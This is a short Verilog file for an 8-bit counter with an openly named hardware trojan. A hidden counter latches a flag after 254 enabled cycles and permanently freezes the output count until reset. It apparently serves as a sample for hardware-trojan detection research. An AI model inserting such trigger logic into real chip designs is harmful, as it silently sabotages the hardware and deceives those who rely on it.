module counter8(input clk, input rst_n, input en, output reg [7:0] count);
  reg [7:0] trojan_counter;
  reg trojan_active;

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trojan_counter <= 8'h00;
      trojan_active  <= 1'b0;
    end else begin
      if (en) trojan_counter <= trojan_counter + 1;
      if (trojan_counter == 8'hFE && en) trojan_active <= 1'b1;
    end
  end

  always @(posedge clk or negedge rst_n) begin
    if (!rst_n)
      count <= 8'h00;
    else if (en && !trojan_active)
      count <= count + 1;
  end
endmodule